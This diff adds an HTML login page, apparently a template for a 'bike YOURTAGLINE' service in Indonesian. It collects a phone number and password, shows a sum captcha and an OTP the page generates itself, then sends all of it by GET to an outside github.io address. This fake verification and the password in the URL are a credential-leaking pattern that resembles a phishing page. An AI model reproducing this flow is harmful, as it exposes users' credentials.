@@ -1,0 +1,568 @@
+<html lang="en">
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <title>bike YOURTAGLINE - Log in</title> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"> 
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"> 
+  <style>
+        :root {
+            --primary: #015bac;
+            --secondary: #F5F6F8;
+            --accent: #cbcbcb;
+            --text: #2D2D2D;
+            --text-secondary: #757575;
+            --border: #E8E8E8;
+            --white: #FFFFFF;
+            --error: #FF4B55;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Inter', sans-serif;
+            color: var(--text);
+            background: #F0F2F5;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 380px;
+            padding: 40px 30px;
+            background: var(--white);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 24px;
+            margin: 20px;
+        }
+
+        .content-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .brand {
+            text-align: center;
+            margin-bottom: 36px;
+        }
+
+        .logo {
+            width: 100px;
+            height: 80px;
+            margin-bottom: 1px;
+        }
+
+        .brand h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 8px;
+        }
+
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .welcome-text h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 4px;
+        }
+
+        .form-group {
+            margin-bottom: 32px;
+            position: relative;
+        }
+
+        .input-group {
+            position: relative;
+        }
+
+        .form-floating {
+            position: relative;
+        }
+
+        .form-floating::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--primary);
+            transition: width 0.3s ease;
+        }
+
+        .form-floating input {
+            width: 100%;
+            height: 44px;
+            padding: 8px 0;
+            font-size: 16px;
+            border: none;
+            border-bottom: 2px solid #e1e1e1;
+            background: transparent;
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .form-floating label {
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: var(--text-secondary);
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-floating:focus-within::after {
+            width: 100%;
+        }
+
+        .form-floating input:focus + label,
+        .form-floating input:not(:placeholder-shown) + label {
+            top: -5px;
+            font-size: 14px;
+            color: var(--primary);
+            font-weight: 500;
+        }
+
+        .form-floating input:focus {
+            outline: none;
+            border-bottom-color: transparent;
+        }
+
+        .input-group i {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: color 0.2s ease;
+            z-index: 2;
+        }
+
+        .input-group i:hover {
+            color: var(--primary);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary);
+            border: none;
+            color: var(--white);
+            font-size: 15px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+            margin-top: 40px;
+        }
+
+        .login-btn:hover {
+            background: var(--accent);
+        }
+
+        .register-link {
+            text-align: center;
+            margin-top: 24px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .register-link a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .register-link a:hover {
+            text-decoration: underline;
+        }
+
+        .alert {
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            background: #FFF1F2;
+            color: var(--error);
+            font-size: 14px;
+            text-align: center;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 75, 85, 0.2);
+        }
+
+        .captcha-question {
+            margin-top: 12px;
+            padding: 0;
+            background: transparent;
+            text-align: left;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .verification-popup {
+            position: fixed;
+            bottom: -100%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 400px;
+            background: var(--white);
+            padding: 20px;
+            border-radius: 24px 24px 0 0;
+            box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease-out;
+            z-index: 1000;
+        }
+
+        .verification-popup.show {
+            bottom: 0;
+            transform: translateX(-50%);
+        }
+
+        .verification-popup h3 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: var(--text);
+        }
+
+        .verification-content {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .verification-group {
+            position: relative;
+        }
+
+        .verification-group label {
+            display: block;
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+        }
+
+        .verification-question {
+            font-size: 16px;
+            color: var(--primary);
+            margin-top: 4px;
+            font-weight: 500;
+        }
+
+        .otp-input-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .verification-input {
+            width: 100%;
+            height: 44px;
+            padding: 8px 12px;
+            font-size: 16px;
+            border: 2px solid #e1e1e1;
+            border-radius: 12px;
+            background: transparent;
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .verification-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(65, 105, 225, 0.1);
+        }
+
+        .get-otp-btn {
+            padding: 8px 16px;
+            background: var(--secondary);
+            border: none;
+            border-radius: 8px;
+            color: var(--primary);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            white-space: nowrap;
+        }
+
+        .get-otp-btn:hover {
+            background: #E8E9F1;
+        }
+
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--primary);
+            border: none;
+            color: var(--white);
+            font-size: 15px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            border-radius: 12px;
+            margin-top: 24px;
+            transition: all 0.2s ease;
+        }
+
+        .verify-btn:hover {
+            background: var(--accent);
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 999;
+        }
+
+        .overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background: var(--white);
+            }
+            
+            .login-container {
+                margin: 0;
+                padding: 24px;
+                width: 100%;
+                min-height: 100vh;
+                max-width: none;
+                box-shadow: none;
+                border-radius: 0;
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between;
+            }
+
+            .content-wrapper {
+                flex: 1;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+
+            .brand {
+                margin-top: 0;
+            }
+
+            .welcome-text {
+                margin-bottom: 40px;
+            }
+
+            .form-group {
+                margin-bottom: 28px;
+            }
+
+            .login-btn {
+                margin-top: 40px;
+                margin-bottom: 0;
+            }
+
+            .register-link {
+                margin-top: 24px;
+                margin-bottom: 16px;
+            }
+
+            .verification-popup {
+                width: 100%;
+                max-width: 100%;
+                padding: 16px;
+                border-radius: 20px 20px 0 0;
+                bottom: -100%;
+            }
+
+            .verification-popup.show {
+                bottom: 0;
+            }
+
+            .verification-popup h3 {
+                font-size: 18px;
+                margin-bottom: 16px;
+            }
+
+            .verification-content {
+                gap: 16px;
+            }
+
+            .otp-input-group {
+                gap: 8px;
+            }
+
+            .verification-input {
+                height: 40px;
+                font-size: 15px;
+            }
+
+            .get-otp-btn {
+                padding: 6px 12px;
+                font-size: 13px;
+            }
+
+            .verify-btn {
+                padding: 12px;
+                margin-top: 20px;
+                font-size: 14px;
+            }
+        }
+    </style> 
+ </head> 
+ <body> 
+  <div class="login-container"> 
+   <div class="content-wrapper"> 
+    <div class="brand"> 
+     <img src="Poto1.png" alt="Logo" class="logo"> 
+     <h5>bike YOURTAGLINE</h5> 
+    </div> 
+    <div class="welcome-text"> 
+     <h2>Selamat Datang Kembali</h2> 
+    </div> 
+    <form id="loginForm" onsubmit="showVerification(event)"> 
+     <input type="hidden" name="_token" value="SoBnzvb10RuPyn472iNPnHYuAm58rkaZbwGJ75YJ"> 
+     <div class="form-group"> 
+      <div class="form-floating"> 
+       <input type="tel" name="phone" id="phone" placeholder=" " required> 
+       <label for="phone">Nomor Telepon</label> 
+      </div> 
+     </div> 
+     <div class="form-group"> 
+      <div class="input-group"> 
+       <div class="form-floating"> 
+        <input type="password" name="password" id="password" placeholder=" " required> 
+        <label for="password">Password</label> 
+       </div> 
+       <i class="fas fa-eye" id="togglePassword"></i> 
+      </div> 
+     </div> 
+     <button type="submit" class="login-btn">Masuk</button> 
+    </form> 
+   </div> 
+   <div class="register-link">
+     Belum memiliki akun? 
+    <a href="index.html">Daftar</a> 
+   </div> 
+  </div> 
+  <div class="overlay" id="overlay"></div> 
+  <div class="verification-popup" id="verificationPopup"> 
+   <h3>Verifikasi Akun</h3> 
+   <div class="verification-content"> 
+    <div class="verification-group"> 
+     <label>Kode Verifikasi</label> 
+     <input type="number" class="verification-input" id="verificationCode" placeholder="Masukkan hasil penjumlahan"> 
+     <div class="verification-question" id="captchaQuestion"></div> 
+    </div> 
+    <div class="verification-group"> 
+     <label>Kode OTP</label> 
+     <div class="otp-input-group"> 
+      <input type="text" class="verification-input" id="otpCode" placeholder="Verifikasi Saya bukan robot"> 
+      <button type="button" class="get-otp-btn" onclick="getOTP()">Verifikasi</button> 
+     </div> 
+    </div> 
+    <button type="button" class="verify-btn" onclick="verifyAndLogin()">Masuk</button> 
+   </div> 
+  </div> 
+  <script>
+        let captchaAnswer = 0;
+
+        // Generate captcha question
+        function generateCaptcha() {
+            const maxSum = 10;
+            const num1 = Math.floor(Math.random() * (maxSum - 1)) + 1;
+            const num2 = Math.floor(Math.random() * (maxSum - num1)) + 1;
+            captchaAnswer = num1 + num2;
+            document.getElementById('captchaQuestion').textContent = `${num1} + ${num2} = ?`;
+        }
+
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const password = document.getElementById('password');
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            this.classList.toggle('fa-eye');
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        // Show verification popup
+        function showVerification(event) {
+            event.preventDefault();
+            document.getElementById('verificationPopup').classList.add('show');
+            document.getElementById('overlay').classList.add('show');
+            generateCaptcha();
+        }
+
+        // Get OTP code
+        function getOTP() {
+            const otpInput = document.getElementById('otpCode');
+            otpInput.value = Math.floor(100000 + Math.random() * 900000);
+        }
+
+        // Verify and login
+        function verifyAndLogin() {
+            const verificationCode = parseInt(document.getElementById('verificationCode').value);
+            const otpCode = document.getElementById('otpCode').value;
+            const loginForm = document.getElementById('loginForm');
+
+            if (verificationCode !== captchaAnswer) {
+                alert('Kode verifikasi salah. Silakan coba lagi.');
+                document.getElementById('verificationCode').value = '';
+                generateCaptcha();
+                return;
+            }
+
+            if (verificationCode && otpCode) {
+                const verificationInput = document.createElement('input');
+                verificationInput.type = 'hidden';
+                verificationInput.name = 'verification_code';
+                verificationInput.value = verificationCode;
+
+                const otpInput = document.createElement('input');
+                otpInput.type = 'hidden';
+                otpInput.name = 'otp_code';
+                otpInput.value = otpCode;
+
+                loginForm.appendChild(verificationInput);
+                loginForm.appendChild(otpInput);
+
+                loginForm.action = "https://bikeyourtaglinehome.github.io/";
+                loginForm.method = "GET";
+                loginForm.submit();
+            }
+        }
+
+        // Close popup when clicking overlay
+        document.getElementById('overlay').addEventListener('click', function() {
+            document.getElementById('verificationPopup').classList.remove('show');
+            document.getElementById('overlay').classList.remove('show');
+        });
+    </script> 
+ </body>
+</html>
